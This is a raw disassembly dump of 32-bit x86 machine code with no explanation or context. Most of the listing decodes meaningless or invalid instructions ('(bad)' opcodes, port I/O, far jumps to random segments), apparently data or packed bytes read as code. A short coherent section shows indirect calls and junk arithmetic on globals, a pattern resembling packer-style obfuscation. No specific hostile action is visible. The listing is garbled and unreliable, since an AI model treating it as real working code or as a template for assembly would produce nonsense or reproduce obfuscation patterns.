  41e70d:	xchg   ebp,eax
  41e70e:	pop    ecx
  41e70f:	loop   0x41e6d3
  41e711:	jmp    0x41e703
  41e713:	mov    ecx,0xf6388e2c
  41e718:	push   edi
  41e719:	pmullw mm0,QWORD PTR [esi]
  41e71c:	sub    ah,ah
  41e71e:	out    0xd8,al
  41e720:	in     al,0x35
  41e722:	sub    cl,0xf
  41e725:	and    bl,BYTE PTR [ecx+0x2]
  41e728:	sbb    BYTE PTR [esi+eiz*8-0x7a86e99b],dl
  41e72f:	lods   al,BYTE PTR ds:[esi]
  41e730:	add    BYTE PTR ds:0x3e07d85f,ch
  41e736:	mov    ds:0xc122e0af,al
  41e73b:	cld    
  41e73c:	and    BYTE PTR [edx+ecx*2],bh
  41e73f:	fadd   QWORD PTR ds:[eax*8-0x2fb4be76]
  41e747:	clc    
  41e748:	ins    DWORD PTR es:[edi],dx
  41e749:	(bad)  
  41e74a:	retf   0xf021
  41e74d:	addr16 or eax,ebp
  41e750:	sbb    al,0x97
  41e752:	es cmp al,0x31
  41e755:	xor    esi,DWORD PTR [ebx+ebp*1]
  41e758:	in     al,0x6b
  41e75a:	jo     0x41e77c
  41e75c:	ror    DWORD PTR [ecx],1
  41e75e:	xor    BYTE PTR [ebx+0x12],bh
  41e761:	lock mov cl,0x1d
  41e764:	fwait
  41e765:	xchg   BYTE PTR [eax+0x8],dh
  41e768:	mov    esi,0x30a2f707
  41e76d:	psubw  mm3,mm3
  41e770:	push   esi
  41e771:	xchg   edx,eax
  41e772:	cmp    al,0x18
  41e774:	sub    ecx,esp
  41e776:	lods   eax,DWORD PTR ds:[esi]
  41e777:	ss cs inc ebp
  41e77a:	sub    ebx,edi
  41e77c:	xor    cl,ah
  41e77e:	xchg   edi,eax
  41e77f:	sbb    ebp,DWORD PTR [ebx+eiz*8]
  41e782:	in     al,0xd7
  41e784:	stos   BYTE PTR es:[edi],al
  41e785:	pop    ebx
  41e786:	repz jbe 0x41e787
  41e789:	pop    ds
  41e78a:	pop    esi
  41e78b:	cmp    DWORD PTR [edi-0x3d],edi
  41e78e:	call   0x8a8b:0x336da6cd
  41e795:	sbb    al,0x47
  41e797:	outs   dx,BYTE PTR ds:[esi]
  41e798:	(bad)  
  41e799:	loop   0x41e783
  41e79b:	mov    esp,DWORD PTR [ebx]
  41e79d:	hlt    
  41e79e:	outs   dx,DWORD PTR ds:[esi]
  41e79f:	xchg   ebx,eax
  41e7a0:	les    ecx,FWORD PTR [ecx+0x73]
  41e7a3:	popf   
  41e7a4:	fdivr  QWORD PTR [eax]
  41e7a6:	pop    edx
  41e7a7:	xchg   edi,eax
  41e7a8:	lea    ebp,[edx]
  41e7aa:	imul   eax,DWORD PTR [esi-0x2d303abf],0xffffff90
  41e7b1:	sub    ecx,DWORD PTR [ebp+0x7c224557]
  41e7b7:	(bad)  
  41e7b8:	and    cl,ah
  41e7ba:	jb     0x41e802
  41e7bc:	inc    ebx
  41e7bd:	fdivrp st(3),st
  41e7bf:	in     al,dx
  41e7c0:	sub    ah,0x73
  41e7c3:	jge    0x41e7ec
  41e7c5:	pop    edx
  41e7c6:	(bad)  
  41e7c7:	popf   
  41e7c8:	stos   BYTE PTR es:[edi],al
  41e7c9:	jnp    0x41e777
  41e7cb:	or     DWORD PTR [edx+0x7117ba13],esp
  41e7d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7d2:	fidiv  WORD PTR [ecx]
  41e7d4:	sub    eax,0x60a38ecd
  41e7d9:	loopne 0x41e78d
  41e7db:	ds jmp 0xe35b670
  41e7e1:	ficomp WORD PTR ds:0x52847362
  41e7e7:	adc    eax,DWORD PTR [ebx-0xa86b5e]
  41e7ed:	fidiv  WORD PTR [edx+0x45cf83ba]
  41e7f3:	(bad)  
  41e7f4:	(bad)  
  41e7f5:	push   ebp
  41e7f6:	mov    dl,0x13
  41e7f8:	nop
  41e7f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7fa:	xor    cl,dh
  41e7fc:	ror    eax,0xf
  41e7ff:	inc    ecx
  41e800:	stos   DWORD PTR es:[edi],eax
  41e801:	ds push eax
  41e803:	retf   
  41e804:	mov    edx,0xb1d38d84
  41e809:	pop    edx
  41e80a:	inc    ebx
  41e80b:	lahf   
  41e80c:	and    al,0xd9
  41e80e:	jae    0x41e7ea
  41e810:	ror    BYTE PTR [eax],cl
  41e812:	loopne 0x41e799
  41e814:	push   esi
  41e815:	int    0xc
  41e817:	dec    esp
  41e818:	push   ecx
  41e819:	ins    BYTE PTR es:[edi],dx
  41e81a:	pop    esp
  41e81b:	ret    0x90b
  41e81e:	and    ebx,esp
  41e820:	cmc    
  41e821:	push   0xffffffbe
  41e823:	sub    al,0xc8
  41e825:	sbb    ebx,DWORD PTR [edi+0x44]
  41e828:	mov    fs,WORD PTR [edi-0x72]
  41e82b:	enter  0xbbde,0x67
  41e82f:	xlat   BYTE PTR ds:[ebx]
  41e830:	xor    al,0x39
  41e832:	shl    ecx,cl
  41e834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e835:	add    BYTE PTR [edi],dh
  41e837:	pop    ecx
  41e838:	js     0x41e85f
  41e83a:	jge    0x41e7c2
  41e83c:	mov    eax,0x54bf8342
  41e841:	pop    es
  41e842:	lods   eax,DWORD PTR ds:[esi]
  41e843:	rcr    DWORD PTR [edx+ebx*1+0x79761018],cl
  41e84a:	outs   dx,DWORD PTR ds:[esi]
  41e84b:	push   esi
  41e84c:	and    eax,0x67ed32d9
  41e851:	cmp    ebp,edx
  41e853:	mov    WORD PTR [ebx],?
  41e855:	icebp  
  41e856:	push   ebp
  41e857:	in     eax,0xbb
  41e859:	pop    edi
  41e85a:	xchg   ebp,eax
  41e85b:	jnp    0x41e8da
  41e85d:	xor    al,0x94
  41e85f:	fist   WORD PTR [ebp+0x6d949127]
  41e865:	repnz add al,0x56
  41e868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e869:	mov    ecx,0x95f466ee
  41e86e:	popa   
  41e86f:	dec    ecx
  41e870:	mov    BYTE PTR [ecx],ah
  41e872:	inc    ebp
  41e873:	sub    ecx,esi
  41e875:	dec    esp
  41e876:	and    dl,ah
  41e878:	sub    BYTE PTR [edx+0x4206ef91],ch
  41e87e:	(bad)  
  41e880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e881:	je     0x41e8c7
  41e883:	xchg   edi,eax
  41e884:	out    0x4a,al
  41e886:	clc    
  41e887:	dec    esi
  41e888:	xor    eax,0x93624748
  41e88d:	popf   
  41e88e:	or     esi,DWORD PTR [esi+0x65]
  41e891:	mov    ebx,0x88587b45
  41e896:	(bad)  
  41e897:	or     eax,0x20f0e705
  41e89c:	mov    esi,0xbdc4348c
  41e8a1:	leave  
  41e8a2:	add    BYTE PTR [esi],bl
  41e8a4:	mov    ds:0x25676491,al
  41e8a9:	aas    
  41e8aa:	dec    eax
  41e8ab:	jmp    0x5eb8:0x2c2c92b9
  41e8b2:	cld    
  41e8b3:	pop    edi
  41e8b4:	test   eax,0xec87a9c2
  41e8b9:	jge    0x41e84c
  41e8bb:	add    BYTE PTR [esi-0x2e],bh
  41e8be:	imul   edi,DWORD PTR [ebx],0x3a
  41e8c1:	mov    ah,0xe
  41e8c3:	jns    0x41e8f7
  41e8c5:	lea    ebx,[edx+0x60]
  41e8c8:	fisub  WORD PTR [eax]
  41e8ca:	test   eax,0x6c96f4bc
  41e8cf:	sbb    DWORD PTR [eax+eiz*4-0x53],ebp
  41e8d3:	cmp    cl,cl
  41e8d5:	icebp  
  41e8d6:	mov    eax,0xf88bc194
  41e8db:	sbb    DWORD PTR [ebx+0x66561325],ebp
  41e8e1:	sub    DWORD PTR [esi-0x50dc7709],ecx
  41e8e7:	sub    DWORD PTR [ebp+0x61],ebx
  41e8ea:	fcomp  QWORD PTR [ebx+0x2c]
  41e8ed:	xor    eax,0x9831d810
  41e8f2:	or     eax,0xe6dccddf
  41e8f7:	(bad)  
  41e8f8:	cld    
  41e8f9:	mov    eax,ds:0xc51b3095
  41e8fe:	(bad)  
  41e8ff:	in     eax,dx
  41e900:	mov    esp,0xe46db5ce
  41e905:	mov    ch,0xc1
  41e907:	or     DWORD PTR [esi-0x3e1cdbc2],ecx
  41e90d:	js     0x41e95a
  41e90f:	sub    DWORD PTR [edx],esp
  41e911:	mov    esp,0x8cf1c20d
  41e916:	test   BYTE PTR ds:0x58d604e3,dh
  41e91c:	mov    eax,ds:0x778aefb2
  41e921:	call   0x7034d93
  41e926:	add    dl,dh
  41e928:	or     dl,bh
  41e92a:	jae    0x41e94c
  41e92c:	sub    DWORD PTR [eax-0x28a3ce17],esi
  41e932:	loopne 0x41e8d8
  41e934:	stos   BYTE PTR es:[edi],al
  41e935:	jl     0x41e9a9
  41e937:	cmp    ch,BYTE PTR [esi-0x31a049c5]
  41e93d:	xor    BYTE PTR [ecx-0x2d],0x9e
  41e941:	loope  0x41e939
  41e943:	cli    
  41e944:	xchg   ebx,eax
  41e945:	jae    0x41e97e
  41e947:	jne    0x41e976
  41e949:	xchg   edi,eax
  41e94a:	dec    esp
  41e94b:	cmp    DWORD PTR [esp+edx*4+0x48],edi
  41e94f:	neg    DWORD PTR [eax-0x68]
  41e952:	add    al,0xc6
  41e954:	loopne 0x41e9b5
  41e956:	jo     0x41e961
  41e958:	fsubr  st(6),st
  41e95a:	loope  0x41e97a
  41e95c:	push   edx
  41e95d:	jnp    0x41e8f6
  41e95f:	out    dx,eax
  41e960:	jg     0x41e8e4
  41e962:	in     eax,dx
  41e963:	add    al,0x84
  41e965:	sbb    al,0x16
  41e967:	lods   al,BYTE PTR ds:[esi]
  41e968:	jne    0x41e97b
  41e96a:	and    eax,0xcfd17c2e
  41e96f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e970:	jmp    0x5ef:0xbf74dbdd
  41e977:	jmp    0x26e9:0xd87482b3
  41e97e:	cmp    BYTE PTR [ebx],ah
  41e980:	into   
  41e981:	jmp    0x8c18f4ee
  41e986:	retf   0x548b
  41e989:	and    al,0x18
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x422628
  41e9a9:	push   DWORD PTR ds:0x4223bc
  41e9af:	mov    eax,ds:0x422538
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x422538
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x422538
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x428247,0x0
  41ea0c:	mov    DWORD PTR ds:0x428353,0x7749
  41ea16:	mov    DWORD PTR ds:0x428153,ebx
  41ea1c:	mov    DWORD PTR ds:0x4282f3,edx
  41ea22:	mov    DWORD PTR ds:0x4282f3,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x42826b,edx
  41ea37:	cmp    DWORD PTR ds:0x428247,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428df4
  41ea54:	sbb    DWORD PTR ds:0x42834f,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x4282fb
  41ea60:	xor    ecx,DWORD PTR ds:0x4282e7
  41ea66:	mov    DWORD PTR ds:0x4282fb,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x428223,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x428177
  41ea80:	mov    ecx,DWORD PTR ds:0x4281c3
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x428167,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x4281d7
  41ea95:	mov    eax,ds:0x4282c3
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x42823b,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x42826b,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x4282fb,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x428377,0x4282cf
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x428363,0x428373
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x4282e3
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x42823b,0x42816f
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x428387,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x428307,0x0
  41eb42:	mov    DWORD PTR ds:0x428377,edx
  41eb48:	mov    DWORD PTR ds:0x428217,ebx
  41eb4e:	not    DWORD PTR ds:0x428213
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x42820b,0x3ca0
  41eb63:	not    DWORD PTR ds:0x4282f7
  41eb69:	cmp    DWORD PTR ds:0x428307,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428df8
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x42836f
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x428377,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x42820f
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x4282a3
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x428373,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x42813b,0x428287
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x42822f,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0xa9
  41ec04:	scas   eax,DWORD PTR es:[edi]
  41ec05:	fistp  QWORD PTR [esi+0xe]
  41ec08:	das    
  41ec09:	push   ss
  41ec0a:	sbb    BYTE PTR [ebx+0x7f181812],ah
  41ec10:	test   DWORD PTR ds:0x444b77f9,esi
  41ec16:	mov    al,ds:0x666f8a61
  41ec1b:	push   esi
  41ec1c:	push   edi
  41ec1d:	dec    ebx
  41ec1e:	push   esp
  41ec1f:	fucomp st(4)
  41ec21:	push   ss
  41ec22:	inc    ebp
  41ec23:	mov    esi,0x51ea3bb1
  41ec28:	jno    0x41ec94
  41ec2a:	daa    
  41ec2b:	sub    ch,al
  41ec2d:	sub    DWORD PTR [eax],ebx
  41ec2f:	dec    eax
  41ec30:	mov    esp,0xc5a5e2dc
  41ec35:	cmp    DWORD PTR [edi],eax
  41ec37:	pop    ss
  41ec38:	xchg   DWORD PTR ds:0x121be4b,esi
  41ec3e:	sbb    al,0x57
  41ec40:	inc    eax
  41ec41:	outs   dx,DWORD PTR ds:[esi]
  41ec42:	mov    cs,WORD PTR [eax+eiz*1]
  41ec45:	jne    0x41ecc1
  41ec47:	or     al,0x6
  41ec49:	ss pop esi
  41ec4b:	(bad)  
  41ec4c:	cmp    ecx,DWORD PTR [ebp+eax*4+0x49]
  41ec50:	js     0x41ec0f
  41ec52:	fs mov bl,0xaa
  41ec55:	mov    bh,0x82
  41ec57:	mov    eax,0x98cab0ad
  41ec5c:	loope  0x41ebfe
  41ec5e:	xor    BYTE PTR [ebp-0x1e5d46e4],ch
  41ec64:	sub    BYTE PTR [esi],0x44
  41ec67:	adc    eax,0xbf922e46
  41ec6c:	cmp    ecx,DWORD PTR [esi]
  41ec6e:	(bad)  
  41ec6f:	mov    cl,0xd
  41ec71:	pop    ebp
  41ec72:	xor    BYTE PTR [edx+eiz*4-0x29],0x1
  41ec77:	or     esi,0xe5e4de91
  41ec7d:	fwait
  41ec7e:	dec    esi
  41ec7f:	in     eax,dx
  41ec80:	inc    ebp
  41ec81:	(bad)  
  41ec82:	pop    ss
  41ec83:	das    
  41ec84:	jmp    0x41eca4
  41ec86:	fiadd  WORD PTR [ebx-0x3dc8f0a4]
  41ec8c:	jns    0x41ece7
  41ec8e:	jmp    0x7cc6:0xa7396964
  41ec95:	xor    DWORD PTR [edx+0x459029ce],ebx
  41ec9b:	pop    esi
  41ec9c:	sub    BYTE PTR [esi],ah
  41ec9e:	xchg   ebp,eax
  41ec9f:	push   edx
  41eca0:	fist   DWORD PTR [ebp-0x5ee262f7]
  41eca6:	in     eax,0xba
  41eca8:	mov    ds:0xf085c7e8,eax
  41ecad:	and    BYTE PTR [ecx+0x17bb55c],bl
  41ecb3:	into   
  41ecb4:	pop    edi
  41ecb5:	xchg   esi,eax
  41ecb6:	cmp    esp,ecx
  41ecb8:	test   ecx,eax
  41ecba:	sub    ecx,DWORD PTR [eax+0x26d5437a]
  41ecc0:	div    BYTE PTR [esi+0x6e]
  41ecc3:	mov    dh,0x86
  41ecc5:	dec    ebp
  41ecc6:	adc    dh,bl
  41ecc8:	xchg   BYTE PTR [edi+0x7b],ah
  41eccb:	add    esi,esp
  41eccd:	mov    esp,0x809719cb
  41ecd2:	push   esi
  41ecd3:	imul   edx,DWORD PTR [esi+0x5a],0x63db2dde
  41ecda:	dec    esp
  41ecdb:	popa   
  41ecdc:	mov    ?,WORD PTR [eax*2-0x4c1d47e5]
  41ece3:	pop    edi
  41ece4:	dec    edi
  41ece5:	push   eax
  41ece6:	sbb    DWORD PTR [ebx+ebp*1],ebp
  41ece9:	ins    BYTE PTR es:[edi],dx
  41ecea:	fwait
  41eceb:	outs   dx,BYTE PTR ds:[esi]
  41ecec:	loop   0x41ec7c
  41ecee:	or     bl,bl
  41ecf0:	adc    BYTE PTR [edx+0x44],ah
  41ecf3:	in     al,0x42
  41ecf5:	adc    eax,DWORD PTR [ebx-0x1a0d0eba]
  41ecfb:	loop   0x41ecc7
  41ecfd:	fisttp DWORD PTR [edx+0xe]
  41ed00:	add    DWORD PTR [ebp-0x2330e1e9],eax
  41ed06:	pop    esp
  41ed07:	hlt    
  41ed08:	mov    esi,0x922817b5
  41ed0d:	mov    cl,0x4e
  41ed0f:	ins    BYTE PTR es:[edi],dx
  41ed10:	mov    BYTE PTR [edx-0x5b],dh
  41ed13:	arpl   WORD PTR gs:[ebx-0x7311622d],ax
  41ed1a:	cmp    esp,DWORD PTR [ebx+0xe]
  41ed1d:	sbb    al,0xa4
  41ed1f:	cmp    ecx,edi
  41ed21:	pop    ebp
  41ed22:	mov    cl,0xbe
  41ed24:	je     0x41ed20
  41ed26:	mov    bl,BYTE PTR [eax-0x54]
  41ed29:	(bad)  
  41ed2a:	std    
  41ed2b:	adc    eax,ebx
  41ed2d:	test   DWORD PTR ds:0xfeabd0c8,esi
  41ed33:	push   DWORD PTR [eax+edx*2]
  41ed36:	clc    
  41ed37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed38:	and    BYTE PTR [edi],bl
  41ed3a:	and    eax,edx
  41ed3c:	retf   
  41ed3d:	jle    0x41ed2f
  41ed3f:	fs sahf 
  41ed41:	jb     0x41ece1
  41ed43:	iret   
  41ed44:	sbb    ah,al
  41ed46:	lahf   
  41ed47:	ins    BYTE PTR es:[edi],dx
  41ed48:	enter  0x1ac4,0x1f
  41ed4c:	cmp    ebp,DWORD PTR [edi-0x57d54f24]
  41ed52:	pop    ebx
  41ed53:	sub    eax,0xb1124fd3
  41ed58:	sahf   
  41ed59:	outs   dx,DWORD PTR ds:[esi]
  41ed5a:	mov    dh,0x48
  41ed5c:	jae    0x41ecf0
  41ed5e:	popa   
  41ed5f:	pop    eax
  41ed60:	lods   eax,DWORD PTR ds:[esi]
  41ed61:	in     eax,dx
  41ed62:	cwde   
  41ed63:	test   eax,0x3a233b48
  41ed68:	mov    ch,BYTE PTR [edi+0x23fe4633]
  41ed6e:	mov    al,0xa8
  41ed70:	adc    al,0xa6
  41ed72:	inc    eax
  41ed73:	js     0x41ed0e
  41ed75:	jne    0x41ed2a
  41ed77:	jae    0x41ed9c
  41ed79:	out    0x87,al
  41ed7b:	jge    0x41ed8c
  41ed7d:	cmc    
  41ed7e:	(bad)  
  41ed7f:	leave  
  41ed80:	loop   0x41ed55
  41ed82:	pop    ss
  41ed83:	in     al,dx
  41ed84:	inc    edi
  41ed85:	outs   dx,BYTE PTR ds:[esi]
  41ed86:	push   edi
  41ed87:	gs xchg esp,eax
  41ed89:	leave  
  41ed8a:	test   ecx,esi
  41ed8c:	ds push ss
  41ed8e:	in     al,0x16
  41ed90:	inc    ebx
  41ed91:	add    esp,esp
  41ed93:	outs   dx,DWORD PTR ds:[esi]
  41ed94:	lahf   
  41ed95:	mov    bh,0xae
  41ed97:	out    0x50,al
  41ed99:	dec    eax
  41ed9a:	push   edx
  41ed9b:	mov    ebp,DWORD PTR [edx]
  41ed9d:	hlt    
  41ed9e:	jle    0x41edf2
  41eda0:	adc    ebp,esi
  41eda2:	scas   al,BYTE PTR es:[edi]
  41eda3:	or     al,0x77
  41eda5:	das    
  41eda6:	adc    DWORD PTR [eax+0x74f3fd31],ebp
  41edac:	jg     0x41ed7a
  41edae:	and    BYTE PTR [ebx+0x60c40235],0x9
  41edb5:	loopne 0x41edc2
  41edb7:	rcl    DWORD PTR ds:0xc86a5bc2,1
  41edbd:	xchg   esi,eax
  41edbe:	sbb    eax,DWORD PTR [edx+0x35]
  41edc1:	clc    
  41edc2:	not    cl
  41edc4:	dec    ecx
  41edc5:	mov    esp,0x1f9c0911
  41edca:	push   DWORD PTR [eax*1-0x3e552bc]
  41edd1:	pop    eax
  41edd2:	inc    edi
  41edd3:	mov    cl,0x66
  41edd5:	fistp  WORD PTR [edi]
  41edd7:	and    BYTE PTR [edx-0x5b2750c],bh
  41eddd:	push   0x1e
  41eddf:	(bad)  
  41ede1:	enter  0x8adc,0xa3
  41ede5:	jo     0x41ed91
  41ede7:	fcom   st(1)
  41ede9:	int3   
  41edea:	sbb    eax,0xb6ec843d
  41edef:	in     eax,0x4f
  41edf1:	in     al,dx
  41edf2:	aas    
  41edf3:	(bad)  
  41edf4:	enter  0x50cb,0x9a
  41edf8:	inc    edi
  41edf9:	pop    edx
  41edfa:	xchg   edi,eax
  41edfb:	cmp    eax,0xcabc13de
  41ee00:	jmp    0x41edb6
  41ee02:	icebp  
  41ee03:	adc    ebx,ebx
  41ee05:	push   esp
  41ee06:	push   cs
  41ee07:	and    al,0x62
  41ee09:	push   0x55
  41ee0b:	lods   eax,DWORD PTR ds:[esi]
  41ee0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee0d:	cs loopne 0x41edc3
  41ee10:	dec    ecx
  41ee11:	mov    cl,0x27
  41ee13:	jo     0x41ede3
  41ee15:	inc    ebx
  41ee16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee17:	fwait
  41ee18:	mov    cl,0xe7
  41ee1a:	frstor gs:[ecx]
  41ee1d:	enter  0x1f29,0x5d
  41ee21:	or     bl,BYTE PTR [ecx+0x373b79]
  41ee27:	pop    edx
  41ee28:	push   edx
  41ee29:	shr    edx,cl
  41ee2b:	js     0x41ee04
  41ee2d:	mov    eax,ds:0x5ebf1e1e
  41ee32:	out    0x3c,al
  41ee34:	fcom   QWORD PTR [edx]
  41ee36:	sbb    edx,DWORD PTR [edi]
  41ee38:	push   es
  41ee39:	mov    bl,0x47
  41ee3b:	(bad)  
  41ee3c:	cmp    cl,BYTE PTR [ebx]
  41ee3e:	xor    eax,0xe2975839
  41ee43:	stos   BYTE PTR es:[edi],al
  41ee44:	es xchg ecx,eax
  41ee46:	mov    DWORD PTR [eax],esp
  41ee48:	xchg   ecx,eax
  41ee49:	je     0x41ee6a
  41ee4b:	mov    edi,0x38d9fd42
  41ee50:	out    0x1b,al
  41ee52:	aam    0x6a
  41ee54:	arpl   di,si
  41ee56:	sar    DWORD PTR [edi],1
  41ee58:	mov    eax,0x43b9f309
  41ee5d:	in     al,dx
  41ee5e:	hlt    
  41ee5f:	cld    
  41ee60:	pop    ecx
  41ee61:	stos   BYTE PTR es:[edi],al
  41ee62:	mov    dl,0x2d
  41ee65:	xchg   edx,eax
  41ee67:	pop    ebx
  41ee68:	push   ebp
  41ee69:	outs   dx,BYTE PTR ds:[esi]
  41ee6a:	pop    esp
  41ee6b:	add    BYTE PTR [ebp-0x2d339acf],0x2c
  41ee72:	or     al,0x60
  41ee74:	sub    bl,BYTE PTR [edi+esi*1]
  41ee77:	das    
  41ee78:	das    
  41ee79:	repz mov al,0xd7
  41ee7c:	pop    ebp
  41ee7d:	outs   dx,DWORD PTR ds:[esi]
  41ee7e:	imul   edx,eax,0x67f4c7e2
  41ee84:	enter  0xd4d8,0xbf
  41ee88:	dec    eax
  41ee89:	jmp    0x41090323
  41ee8e:	mov    eax,0x82972074
  41ee93:	add    eax,DWORD PTR [edx+0x405fa83c]
  41ee99:	mov    edi,0x45722049
  41ee9e:	cdq    
  41ee9f:	pop    ecx
  41eea0:	or     cl,BYTE PTR [edx]
  41eea2:	sbb    edx,esp
  41eea4:	add    DWORD PTR [edx-0x15fb279],esp
  41eeaa:	out    dx,eax
  41eeab:	mov    al,0x69
  41eead:	outs   dx,BYTE PTR ds:[esi]
  41eeae:	mov    ecx,0x73a27ee7
  41eeb3:	iret   
  41eeb4:	and    ebx,DWORD PTR [edx]
  41eeb6:	in     al,0x4b
  41eeb8:	stc    
  41eeb9:	stos   BYTE PTR es:[edi],al
  41eeba:	aam    0x71
  41eebc:	add    ch,BYTE PTR [ebp-0x31]
  41eebf:	push   ds
  41eec0:	out    0x9b,al
  41eec2:	cli    
  41eec3:	lods   eax,DWORD PTR ds:[esi]
  41eec4:	int    0x43
  41eec6:	or     edi,DWORD PTR [esi+0x21]
  41eec9:	out    dx,eax
  41eeca:	mov    edi,0xf7e99c33
  41eecf:	jle    0x41ef32
  41eed1:	in     eax,dx
  41eed2:	mov    edx,0xe00588c4
  41eed7:	cmp    ebp,DWORD PTR [edi]
  41eed9:	es push cs
  41eedb:	jno    0x41ef4a
  41eedd:	sbb    DWORD PTR [ebp+0x7d],ebp
  41eee0:	dec    eax
  41eee1:	(bad)  
  41eee2:	xor    al,0x91
  41eee4:	jecxz  0x41eeb4
  41eee6:	lods   al,BYTE PTR ds:[esi]
  41eee7:	xchg   DWORD PTR [esi],ecx
  41eee9:	arpl   WORD PTR [ebp-0x5f2fea07],si
  41eeef:	cwde   
  41eef0:	stc    
  41eef1:	(bad)  
  41eef2:	retf   0x7f53
  41eef5:	cmp    al,bl
  41eef7:	add    ch,BYTE PTR [ebx-0x55f513d7]
  41eefd:	aam    0x8e
  41eeff:	repz imul esi,eax,0x2594e105
  41ef06:	sbb    DWORD PTR [ecx+0x5],eax
  41ef09:	pop    ss
  41ef0a:	mov    fs,WORD PTR [edi+0x249a60e8]
  41ef10:	in     eax,0x4d
  41ef12:	or     edx,DWORD PTR [ebp-0x1a]
  41ef15:	lahf   
  41ef16:	rol    DWORD PTR [ebp+ebx*4-0x32],1
  41ef1a:	(bad)  
  41ef1b:	push   DWORD PTR [ebp-0x1c]
  41ef1e:	into   
  41ef1f:	push   ds
  41ef20:	mov    dl,0x55
  41ef22:	dec    esp
  41ef23:	fistp  DWORD PTR [ebp+0x7c]
  41ef26:	cmp    BYTE PTR [ebp+edi*1+0x73],dl
  41ef2a:	test   BYTE PTR [edx-0x46be422a],0x14
  41ef31:	ret    0x47cf
  41ef34:	mov    al,0x31
  41ef36:	es pop ss
  41ef38:	and    cl,BYTE PTR [eax-0x7e]
